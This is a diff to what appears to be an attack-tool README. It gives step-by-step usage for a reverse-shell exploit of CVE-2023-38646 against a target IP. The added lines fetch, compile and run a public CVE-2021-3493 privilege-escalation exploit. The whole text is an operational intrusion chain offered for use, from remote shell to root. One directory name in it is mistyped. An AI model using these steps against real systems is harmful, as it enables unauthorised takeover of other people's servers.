@@ -6,5 +6,11 @@ pip install -r requirements.txt
 python3 CVE-2023-38646-Reverse-Shell.py -h
 #the before run reverse shell start netact listeiner and  go back to run script as follows
 python3 CVE-2023-38646-Reverse-Shell.py --rhost {Target Ip address} --lhost {your ip-adress} --lport {port to listen rervse shell} 
+
 # Privileges escalation
-git clone 
+git clone https://github.com/briskets/CVE-2021-3493.git
+cd CVE-2021-349
+Usage
+    gcc exploit.c -o exploit
+#The uplaod  the file
+    ./exploit
